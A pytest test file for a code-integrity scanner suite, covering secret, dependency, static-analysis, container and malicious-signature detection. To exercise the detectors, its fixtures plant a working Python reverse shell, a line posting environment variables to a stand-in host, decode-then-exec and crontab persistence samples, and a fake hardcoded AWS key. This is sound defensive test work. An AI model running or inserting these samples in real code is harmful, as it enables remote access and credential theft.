# CUI // SP-CTI
"""Tests for SIPA scanner adapters (sipa-scan-01).

Covers the acceptance criteria for ``tools/integrity/scanners.py``:

  * Each adapter shells out to an existing scanner and folds its output into the
    ``integrity_findings`` shape (source_scanner / finding_type / severity /
    file_path / line / detail), persisted append-only.
  * Every scanner's native severity vocabulary maps onto ``constants.SEVERITY``.
  * A fixture with a **hardcoded secret** is detected end-to-end via the real
    ``secret_detector`` shell-out (built-in pattern fallback, offline).
  * A fixture with a **known-bad dependency manifest** is normalized via the
    subprocess seam (monkeypatched) so the test is deterministic without
    pip-audit / npm / the network present.

SQLite-backed via the shared ``icdev_db`` fixture; quarantine is redirected to a
tmp dir so staging never touches the repo tree.
"""
from pathlib import Path

import pytest

from tools.integrity import constants, ingest, scanners


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture
def staged_env(icdev_db, tmp_path, monkeypatch):
    """Point get_connection() at the temp SQLite db and quarantine at tmp."""
    monkeypatch.setenv("ICDEV_DB_PATH", str(icdev_db))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    monkeypatch.setenv("ICDEV_INTEGRITY_QUARANTINE_DIR", str(tmp_path / "quarantine"))
    return icdev_db


def _make_target(root: Path) -> Path:
    """A target tree with a hardcoded secret + a known-bad dependency manifest."""
    src = Path(root)
    src.mkdir(parents=True, exist_ok=True)
    # Hardcoded AWS access key (NOT an 'example'/'placeholder' string, so the
    # built-in secret scanner does not skip it) + a hardcoded password.
    (src / "config.py").write_text(
        "# service credentials\n"
        'API_KEY = "AKIAQYLPMN5HGNAZ7XYZ"\n'
        'DB_PASSWORD = "s3cr3t-hunter2-hunter2"\n',
        encoding="utf-8",
    )
    # Known-bad dependency manifest (old, CVE-laden pins).
    (src / "requirements.txt").write_text(
        "flask==0.12.2\nrequests==2.19.1\npyyaml==3.13\n", encoding="utf-8"
    )
    (src / "main.py").write_text("print('hello')\n", encoding="utf-8")
    return src


def _findings(aid):
    """All integrity_findings rows for an assessment, as dicts."""
    from tools.db.storage import get_connection

    conn = get_connection()
    try:
        rows = conn.execute(
            "SELECT source_scanner, finding_type, severity, file_path, line, detail "
            "FROM integrity_findings WHERE assessment_id = ? ORDER BY id",
            (aid,),
        ).fetchall()
    finally:
        conn.close()
    return [dict(r) for r in rows]


def _new_assessment(staged_env) -> int:
    """Insert a bare quarantine assessment row and return its id (FK target)."""
    from tools.db.storage import get_connection
    from tools.integrity.db.init_db import init_db

    conn = get_connection()
    try:
        init_db(conn)
        cur = conn.execute(
            "INSERT INTO integrity_assessments "
            "(source_type, source_ref, mode, status) VALUES (?, ?, ?, ?)",
            ("local", "fixture", "provenance_blind", "quarantine"),
        )
        conn.commit()
        return int(cur.lastrowid)
    finally:
        conn.close()


def _canned(stdout: str):
    """A fake _invoke_scanner returning canned stdout (rc=0)."""
    def _fake(cmd, timeout):
        _fake.cmd = cmd  # captured for assertions
        return 0, stdout, ""
    return _fake


# --------------------------------------------------------------------------- #
# Severity normalization — folds every scanner scale into constants.SEVERITY
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "raw, expected",
    [
        ("CRITICAL", "critical"),
        ("High", "high"),
        ("medium", "medium"),
        ("LOW", "low"),
        ("info", "info"),
        ("moderate", "medium"),   # npm audit
        ("warning", "medium"),    # clippy / linters
        ("error", "high"),
        ("note", "low"),
        ("unknown", "info"),      # pip-audit w/o CVSS
        ("", "info"),
        (None, "info"),
        ("bogus-value", "info"),  # unrecognized -> default
    ],
)
def test_norm_severity_maps_into_constants(raw, expected):
    out = scanners._norm_severity(raw)
    assert out == expected
    assert out in constants.SEVERITY


def test_norm_severity_honours_default():
    assert scanners._norm_severity(None, default="high") == "high"
    assert scanners._norm_severity("nonsense", default="low") == "low"


# --------------------------------------------------------------------------- #
# End-to-end: a hardcoded secret is found via the REAL secret_detector shell-out
# --------------------------------------------------------------------------- #
def test_secret_scan_detects_hardcoded_secret_end_to_end(staged_env, tmp_path):
    src = _make_target(tmp_path / "target_pkg")
    staged = ingest.stage(str(src))
    aid = staged["assessment_id"]

    result = scanners.run_secret_scan(aid)  # resolves staged path from quarantine

    assert result["scanner"] == "secrets"
    assert result["success"] is True
    assert result["findings_persisted"] >= 1

    rows = _findings(aid)
    secret_rows = [r for r in rows if r["source_scanner"] == "secrets"]
    assert secret_rows, "expected at least one persisted secret finding"
    for r in secret_rows:
        assert r["finding_type"] == "secret"
        assert r["severity"] in constants.SEVERITY


# --------------------------------------------------------------------------- #
# Deterministic normalization via the subprocess seam (monkeypatched)
# --------------------------------------------------------------------------- #
def test_secret_scan_normalizes_canned_output(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)
    payload = (
        '{"tool":"builtin-scanner","findings":['
        '{"file":"config.py","line":2,"type":"AWS Access Key",'
        '"severity":"critical","match_preview":"API_KEY = [REDACTED]"}]}'
    )
    monkeypatch.setattr(scanners, "_invoke_scanner", _canned(payload))

    result = scanners.run_secret_scan(aid, staged_path="/quarantine/x")
    assert result["success"] and result["findings_persisted"] == 1

    (r,) = _findings(aid)
    assert r["source_scanner"] == "secrets"
    assert r["finding_type"] == "secret"
    assert r["severity"] == "critical"
    assert r["file_path"] == "config.py"
    assert r["line"] == 2
    assert "AWS Access Key" in r["detail"]


def test_dependency_scan_normalizes_known_bad_manifest(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = str(tmp_path / "x")
    # Mirrors dependency_auditor's CLI shape: {results: {lang: {findings:[...]}}}.
    payload = (
        '{"results":{"python":{"findings":['
        '{"package":"flask","version":"0.12.2","vulnerability_id":"PYSEC-2019-179",'
        '"description":"XSS in flask","severity":"high","fix_versions":["0.12.3"]},'
        '{"package":"requests","version":"2.19.1","vulnerability_id":"PYSEC-2018-28",'
        '"severity":"moderate"},'
        '{"package":"pyyaml","version":"3.13","vulnerability_id":"CVE-2017-18342",'
        '"severity":"unknown"}]}},"total_findings":3}'
    )
    fake = _canned(payload)
    monkeypatch.setattr(scanners, "_invoke_scanner", fake)

    result = scanners.run_dependency_scan(aid, staged_path=staged)
    assert result["success"] and result["findings_persisted"] == 3

    # The adapter targeted the dependency auditor in auto mode against the staged tree.
    assert any("dependency_auditor.py" in c for c in fake.cmd)
    assert "auto" in fake.cmd and staged in fake.cmd

    rows = _findings(aid)
    assert {r["finding_type"] for r in rows} == {"vuln_dependency"}
    assert {r["source_scanner"] for r in rows} == {"deps"}
    sev_by_pkg = {r["file_path"]: r["severity"] for r in rows}
    assert sev_by_pkg["flask==0.12.2"] == "high"
    assert sev_by_pkg["requests==2.19.1"] == "medium"   # moderate -> medium
    assert sev_by_pkg["pyyaml==3.13"] == "info"          # unknown -> info
    for r in rows:
        assert r["line"] is None
        assert "vulnerability_id" in r["detail"]


def test_sast_scan_normalizes_canned_output(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = tmp_path / "x"
    app_py = staged / "app.py"  # absolute path, as a real SAST tool reports
    payload = (
        '{"all_findings":['
        '{"file":' + repr(str(app_py)).replace("'", '"') + ',"line":10,"severity":"HIGH",'
        '"test_id":"B602","test_name":"subprocess_with_shell",'
        '"issue_text":"shell=True identified","confidence":"HIGH","issue_cwe":{"id":78}}]}'
    )
    monkeypatch.setattr(scanners, "_invoke_scanner", _canned(payload))

    result = scanners.run_sast_scan(aid, staged_path=str(staged))
    assert result["success"] and result["findings_persisted"] == 1

    (r,) = _findings(aid)
    assert r["source_scanner"] == "sast"
    assert r["finding_type"] == "dangerous_api"
    assert r["severity"] == "high"          # HIGH -> high
    assert r["file_path"] == "app.py"        # relativized to staged root
    assert r["line"] == 10
    assert "shell=True" in r["detail"]


# --------------------------------------------------------------------------- #
# Resilience — a broken/absent scanner degrades gracefully (no crash, no rows)
# --------------------------------------------------------------------------- #
def test_scanner_failure_is_graceful(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)

    def _broken(cmd, timeout):
        return 127, "", "scanner executable not found"

    monkeypatch.setattr(scanners, "_invoke_scanner", _broken)

    result = scanners.run_dependency_scan(aid, staged_path="/quarantine/x")
    assert result["success"] is False
    assert result["findings_persisted"] == 0
    assert result["error"]
    assert _findings(aid) == []


def test_unparseable_output_is_graceful(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)
    monkeypatch.setattr(scanners, "_invoke_scanner", _canned("not json at all"))

    result = scanners.run_sast_scan(aid, staged_path="/quarantine/x")
    assert result["success"] is False
    assert _findings(aid) == []


# --------------------------------------------------------------------------- #
# scan_all — fan-out across enabled scanners + toggle respect
# --------------------------------------------------------------------------- #
def _dispatch_fake(secret_json, dep_json, sast_json):
    """A fake _invoke_scanner that returns the right canned JSON per scanner cmd."""
    def _fake(cmd, timeout):
        joined = " ".join(cmd)
        if "secret_detector.py" in joined:
            return 0, secret_json, ""
        if "dependency_auditor.py" in joined:
            return 0, dep_json, ""
        return 0, sast_json, ""  # the run_sast `-c` snippet
    return _fake


def test_scan_all_runs_every_enabled_scanner(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)
    monkeypatch.setattr(
        scanners,
        "_invoke_scanner",
        _dispatch_fake(
            secret_json='{"findings":[{"file":"config.py","line":2,"type":"pw","severity":"high"}]}',
            dep_json='{"results":{"python":{"findings":['
            '{"package":"flask","version":"0.12.2","vulnerability_id":"V1","severity":"critical"}]}}}',
            sast_json='{"all_findings":[{"file":"main.py","line":1,"severity":"LOW","issue_text":"x"}]}',
        ),
    )
    # Signature scan uses its own engine (not _invoke_scanner); stub it to no hits
    # so this fan-out test stays deterministic without the Semgrep binary.
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])

    result = scanners.scan_all(aid, staged_path="/quarantine/x")
    assert result["total_findings"] == 3
    assert set(result["scanners"]) == {"sast", "secrets", "deps", "semgrep"}
    for name in ("sast", "secrets", "deps"):
        assert result["scanners"][name]["success"]
        assert result["scanners"][name]["findings_persisted"] == 1
    # semgrep is enabled (default + config) but found nothing this run.
    assert result["scanners"]["semgrep"]["success"]
    assert result["scanners"]["semgrep"]["findings_persisted"] == 0

    scanners_seen = {r["source_scanner"] for r in _findings(aid)}
    assert scanners_seen == {"sast", "secrets", "deps"}


def test_scan_all_respects_disabled_toggle(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)
    monkeypatch.setattr(
        scanners,
        "_invoke_scanner",
        _dispatch_fake(
            secret_json='{"findings":[]}',
            dep_json='{"results":{}}',
            sast_json='{"all_findings":[]}',
        ),
    )
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
    # Disable the deps scanner via config.
    monkeypatch.setattr(
        scanners, "_load_config", lambda: {"scanners": {"deps": False}}
    )

    result = scanners.scan_all(aid, staged_path="/quarantine/x")
    assert result["scanners"]["deps"].get("skipped") is True
    assert result["scanners"]["sast"].get("skipped") is not True
    assert result["scanners"]["secrets"].get("skipped") is not True


# --------------------------------------------------------------------------- #
# formal_verifier adapter — property-check findings recorded as 'formal'
# --------------------------------------------------------------------------- #
def test_formal_scan_records_findings(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = tmp_path / "x"
    app_py = staged / "app.py"  # absolute path, as verify_project reports
    # Mirror formal_verifier.verify_project output: file_results -> check_results.
    # Two property checks flag defects; the advisory cui_marking check is ignored.
    payload = (
        '{"project_dir":"' + str(staged).replace("\\", "/") + '","file_results":[{'
        '"file":' + repr(str(app_py)).replace("'", '"') + ','
        '"check_results":['
        '{"check_name":"sql_injection_immunity","check_category":"security",'
        '"severity":"critical","findings":[{"line":12,"description":"f-string in SQL execute","severity":"critical"}]},'
        '{"check_name":"dangerous_patterns","check_category":"security",'
        '"severity":"high","findings":[{"line":20,"description":"eval() usage","severity":"warning"}]},'
        '{"check_name":"cui_marking_presence","check_category":"compliance",'
        '"severity":"warning","findings":[{"description":"No CUI marking found"}]}'
        ']}]}'
    )
    monkeypatch.setattr(scanners, "_invoke_scanner", _canned(payload))

    result = scanners.run_formal_scan(aid, staged_path=str(staged))
    assert result["scanner"] == "formal"
    assert result["success"] is True
    # Two property findings recorded; the advisory cui_marking finding is excluded.
    assert result["findings_persisted"] == 2

    rows = _findings(aid)
    assert {r["source_scanner"] for r in rows} == {"formal"}
    assert {r["finding_type"] for r in rows} == {"dangerous_api"}
    by_line = {r["line"]: r for r in rows}
    assert by_line[12]["severity"] == "critical"
    assert by_line[20]["severity"] == "medium"      # warning -> medium
    assert by_line[12]["file_path"] == "app.py"      # relativized to staged root
    assert "sql_injection_immunity" in by_line[12]["detail"]


def test_formal_scan_clean_tree_records_nothing(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    # verify_project found files but every check passed (no findings).
    payload = '{"file_results":[{"file":"main.py","check_results":[' \
              '{"check_name":"dangerous_patterns","severity":"info","findings":[]}]}]}'
    monkeypatch.setattr(scanners, "_invoke_scanner", _canned(payload))

    result = scanners.run_formal_scan(aid, staged_path=str(tmp_path / "x"))
    assert result["success"] is True
    assert result["findings_persisted"] == 0
    assert _findings(aid) == []


# --------------------------------------------------------------------------- #
# container adapter — conditional: no-op without a Dockerfile, scans with one
# --------------------------------------------------------------------------- #
def test_container_scan_noop_without_dockerfile(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = tmp_path / "plain_pkg"
    staged.mkdir(parents=True)
    (staged / "main.py").write_text("print('hi')\n", encoding="utf-8")

    # _invoke_scanner must never be called when there is no Dockerfile.
    def _boom(cmd, timeout):
        raise AssertionError("container scanner invoked despite no Dockerfile")

    monkeypatch.setattr(scanners, "_invoke_scanner", _boom)

    result = scanners.run_container_scan(aid, staged_path=str(staged))
    assert result["scanner"] == "container"
    assert result["success"] is True
    assert result["skipped"] is True
    assert result["findings_persisted"] == 0
    assert result["error"] is None
    assert _findings(aid) == []


def test_container_scan_records_dockerfile_findings(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = tmp_path / "containerized"
    staged.mkdir(parents=True)
    (staged / "Dockerfile").write_text(
        "FROM python:latest\nADD . /app\n", encoding="utf-8"
    )

    df_path = str(staged / "Dockerfile")
    payload = (
        '{"dockerfile_scan":{"tool":"dockerfile-analyzer","file":' + repr(df_path).replace("'", '"') + ','
        '"findings":['
        '{"check_id":"DS001","name":"Running as root","description":"no USER",'
        '"severity":"HIGH","line":0,"line_content":"(no USER directive found)"},'
        '{"check_id":"DS007","name":"Secrets in ENV","description":"secret",'
        '"severity":"HIGH","line":3,"line_content":"ENV API_KEY=..."}]}}'
    )
    fake = _canned(payload)
    monkeypatch.setattr(scanners, "_invoke_scanner", fake)

    result = scanners.run_container_scan(aid, staged_path=str(staged))
    assert result["success"] is True
    assert "skipped" not in result        # a real scan, not the no-op path
    assert result["findings_persisted"] == 2
    # The adapter targeted container_scanner.py with the discovered Dockerfile.
    assert any("container_scanner.py" in c for c in fake.cmd)
    assert "--dockerfile" in fake.cmd

    rows = _findings(aid)
    assert {r["source_scanner"] for r in rows} == {"container"}
    # DS007 (secret in ENV) -> finding_type 'secret'; DS001 -> 'dangerous_api'.
    assert {r["finding_type"] for r in rows} == {"dangerous_api", "secret"}
    for r in rows:
        assert r["severity"] == "high"   # HIGH -> high


def test_container_scan_with_image_runs_trivy_path(staged_env, tmp_path, monkeypatch):
    """An explicit image ref triggers the scan even without a Dockerfile."""
    aid = _new_assessment(staged_env)
    staged = tmp_path / "img_only"
    staged.mkdir(parents=True)

    payload = (
        '{"image_scan":{"tool":"trivy","image":"myapp:latest","findings":['
        '{"target":"myapp","vulnerability_id":"CVE-2021-1234","package":"openssl",'
        '"installed_version":"1.1.1","fixed_version":"1.1.1k","severity":"CRITICAL",'
        '"title":"buffer overflow"}]}}'
    )
    fake = _canned(payload)
    monkeypatch.setattr(scanners, "_invoke_scanner", fake)

    result = scanners.run_container_scan(aid, staged_path=str(staged), image="myapp:latest")
    assert result["success"] is True
    assert result["findings_persisted"] == 1
    assert "--image" in fake.cmd

    (r,) = _findings(aid)
    assert r["source_scanner"] == "container"
    assert r["finding_type"] == "vuln_dependency"
    assert r["severity"] == "critical"
    assert r["file_path"] == "openssl==1.1.1"
    assert r["line"] is None


# --------------------------------------------------------------------------- #
# scan_all — opt-in scanners stay out unless enabled, then participate
# --------------------------------------------------------------------------- #
def test_scan_all_omits_optin_scanners_by_default(staged_env, monkeypatch):
    aid = _new_assessment(staged_env)
    monkeypatch.setattr(
        scanners,
        "_invoke_scanner",
        _dispatch_fake(
            secret_json='{"findings":[]}',
            dep_json='{"results":{}}',
            sast_json='{"all_findings":[]}',
        ),
    )
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
    # Real config has formal/container off -> they must not appear in the report.
    result = scanners.scan_all(aid, staged_path="/quarantine/x")
    assert "formal" not in result["scanners"]
    assert "container" not in result["scanners"]
    # semgrep IS on by default/config, so it participates.
    assert "semgrep" in result["scanners"]


def test_scan_all_runs_formal_when_enabled(staged_env, tmp_path, monkeypatch):
    aid = _new_assessment(staged_env)
    staged = tmp_path / "x"
    payload = (
        '{"file_results":[{"file":"a.py","check_results":['
        '{"check_name":"dangerous_patterns","severity":"high",'
        '"findings":[{"line":3,"description":"exec() usage","severity":"critical"}]}]}]}'
    )

    def _fake(cmd, timeout):
        joined = " ".join(cmd)
        if "formal_verifier" in joined:
            return 0, payload, ""
        if "secret_detector.py" in joined:
            return 0, '{"findings":[]}', ""
        if "dependency_auditor.py" in joined:
            return 0, '{"results":{}}', ""
        return 0, '{"all_findings":[]}', ""

    monkeypatch.setattr(scanners, "_invoke_scanner", _fake)
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
    # Enable formal via config; container stays off. semgrep omitted -> default on.
    monkeypatch.setattr(
        scanners,
        "_load_config",
        lambda: {"scanners": {"sast": True, "secrets": True, "deps": True, "formal": True}},
    )

    result = scanners.scan_all(aid, staged_path=str(staged))
    assert "formal" in result["scanners"]
    assert result["scanners"]["formal"]["findings_persisted"] == 1
    assert "container" not in result["scanners"]  # still off
    assert any(r["source_scanner"] == "formal" for r in _findings(aid))


# --------------------------------------------------------------------------- #
# Malicious-signature scan — Semgrep rules + deterministic regex fallback
# --------------------------------------------------------------------------- #
_REVERSE_SHELL = (
    "import socket, subprocess, os\n"
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    's.connect(("10.0.0.1", 4444))\n'
    "os.dup2(s.fileno(), 0)\n"
    "os.dup2(s.fileno(), 1)\n"
    "os.dup2(s.fileno(), 2)\n"
    'subprocess.call(["/bin/sh", "-i"])\n'
)

# A benign socket server + legitimate base64/import use — must NOT trip any rule.
_BENIGN = (
    "import socket, base64, importlib\n"
    "def serve():\n"
    "    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    '    srv.bind(("0.0.0.0", 8080))\n'
    "    srv.listen(5)\n"
    "    conn, _ = srv.accept()\n"
    "    return conn.recv(1024)\n"
    "def token(t):\n"
    "    return base64.b64decode(t).decode()\n"
    'def load():\n'
    '    return importlib.import_module("os")\n'
)


def _staged_with(tmp_path, name, content):
    d = tmp_path / "sig_target"
    d.mkdir(parents=True, exist_ok=True)
    (d / name).write_text(content, encoding="utf-8")
    return d


def test_signature_fallback_trips_on_reverse_shell(staged_env, tmp_path, monkeypatch):
    """Planted reverse-shell fixture trips a known_bad_signature via the fallback."""
    aid = _new_assessment(staged_env)
    staged = _staged_with(tmp_path, "evil.py", _REVERSE_SHELL)
    # Force the Semgrep-absent path so the test never depends on the binary.
    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)

    result = scanners.run_signature_scan(aid, staged_path=str(staged))
    assert result["scanner"] == "semgrep"
    assert result["success"] is True
    assert result["engine"] == "regex_fallback"
    assert result["findings_persisted"] >= 1

    rows = _findings(aid)
    assert rows, "expected at least one known_bad_signature finding"
    for r in rows:
        assert r["source_scanner"] == "semgrep"
        assert r["finding_type"] == "known_bad_signature"
        assert r["file_path"] == "evil.py"          # relativized to staged root
        assert r["line"] is not None
        assert '"category": "reverse_shell"' in r["detail"]
        assert "rule_id" in r["detail"]
    # reverse_shell is critical severity.
    assert any(r["severity"] == "critical" for r in rows)


def test_signature_fallback_benign_file_no_findings(staged_env, tmp_path, monkeypatch):
    """A benign socket/base64/import file does not trip any malicious signature."""
    aid = _new_assessment(staged_env)
    staged = _staged_with(tmp_path, "ok.py", _BENIGN)
    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)

    result = scanners.run_signature_scan(aid, staged_path=str(staged))
    assert result["success"] is True
    assert result["findings_persisted"] == 0
    assert _findings(aid) == []


def test_signature_fallback_covers_each_category(tmp_path):
    """Each signature category matches its idiom and benign code stays clean."""
    samples = {
        "reverse_shell": 'subprocess.Popen(["/bin/bash", "-i"], stdin=s)\n',
        "decode_then_exec": "exec(base64.b64decode(payload))\n",
        "credential_exfil": 'requests.post("https://evil.test/x", data=os.environ)\n',
        "dynamic_import": "importlib.import_module(user_supplied)\n",
        "persistence": 'os.system("crontab -l > /tmp/c")\n',
    }
    for category, line in samples.items():
        staged = _staged_with(tmp_path / category, "m.py", line)
        hits = scanners._signature_fallback_scan(staged)
        cats = {h["category"] for h in hits}
        assert category in cats, f"{category} not detected in: {line!r}"

    benign = _staged_with(tmp_path / "benign", "b.py", _BENIGN)
    assert scanners._signature_fallback_scan(benign) == []


def test_signature_semgrep_path_maps_hits(staged_env, tmp_path, monkeypatch):
    """When Semgrep runs, its hits map to known_bad_signature with rule id + line."""
    aid = _new_assessment(staged_env)
    staged = tmp_path / "x"
    evil = staged / "dropper.py"
    canned = [
        {
            "rule_id": "sipa-decode-then-exec-py",
            "category": "decode_then_exec",
            "file": str(evil),
            "line": 12,
            "message": "decode-then-exec",
        },
        {
            "rule_id": "sipa-dynamic-import-py",
            "category": "dynamic_import",
            "file": str(evil),
            "line": 20,
            "message": "dynamic import",
        },
    ]
    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: canned)

    result = scanners.run_signature_scan(aid, staged_path=str(staged))
    assert result["success"] is True
    assert result["engine"] == "semgrep"
    assert result["findings_persisted"] == 2

    rows = _findings(aid)
    by_line = {r["line"]: r for r in rows}
    assert by_line[12]["finding_type"] == "known_bad_signature"
    assert by_line[12]["source_scanner"] == "semgrep"
    assert by_line[12]["severity"] == "critical"        # decode_then_exec
    assert by_line[12]["file_path"] == "dropper.py"      # relativized
    assert "sipa-decode-then-exec-py" in by_line[12]["detail"]
    assert by_line[20]["severity"] == "medium"           # dynamic_import
    assert '"engine": "semgrep"' in by_line[20]["detail"]


def test_signature_scan_in_fan_out(staged_env, tmp_path, monkeypatch):
    """scan_all wires the signature scanner under the 'semgrep' key."""
    aid = _new_assessment(staged_env)
    staged = _staged_with(tmp_path, "evil.py", _REVERSE_SHELL)
    # Other scanners: no-op; signature scanner: force fallback over the real tree.
    monkeypatch.setattr(
        scanners,
        "_invoke_scanner",
        _dispatch_fake('{"findings":[]}', '{"results":{}}', '{"all_findings":[]}'),
    )
    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)

    result = scanners.scan_all(aid, staged_path=str(staged))
    assert "semgrep" in result["scanners"]
    assert result["scanners"]["semgrep"]["findings_persisted"] >= 1
    assert any(
        r["finding_type"] == "known_bad_signature" for r in _findings(aid)
    )


def test_signature_scan_in_gitignored_quarantine_tree(staged_env):
    """Regression (eqo-sipa-s1): a planted payload under the gitignored ``.tmp/``
    quarantine tree is still detected, NOT silently skipped.

    No monkeypatch of ``_detect_signatures`` — this exercises the real path. The
    quarantine staging dir lives under ``<repo>/.tmp/`` (gitignored). Before the
    fix, Semgrep walked up to the repo ``.gitignore``, skipped every staged file,
    and returned ``[]`` (zero hits, not ``None``) — so the regex fallback never
    ran and ``run_signature_scan`` persisted 0 findings. The fix passes
    ``--no-git-ignore`` so Semgrep scans the quarantine tree regardless. When
    Semgrep is absent, the regex fallback (manual os.walk) detects it either way.
    """
    import shutil as _shutil

    aid = _new_assessment(staged_env)
    # Stage under the repo's real gitignored .tmp/ tree (the exact bug condition).
    staged = ingest.BASE_DIR / ".tmp" / "_sipa_s1_regression" / str(aid)
    staged.mkdir(parents=True, exist_ok=True)
    try:
        (staged / "payload.py").write_text(_REVERSE_SHELL, encoding="utf-8")

        result = scanners.run_signature_scan(aid, staged_path=str(staged))
        assert result["success"] is True
        # The core regression assertion: the scan is NOT silently empty.
        assert result["findings_persisted"] >= 1, (
            "signature scan persisted 0 findings on a gitignored quarantine tree "
            f"(engine={result['engine']}) — scanner silently disabled"
        )
        rows = _findings(aid)
        assert any(r["finding_type"] == "known_bad_signature" for r in rows)
        assert any(r["severity"] == "critical" for r in rows)  # reverse_shell
    finally:
        _shutil.rmtree(ingest.BASE_DIR / ".tmp" / "_sipa_s1_regression", ignore_errors=True)
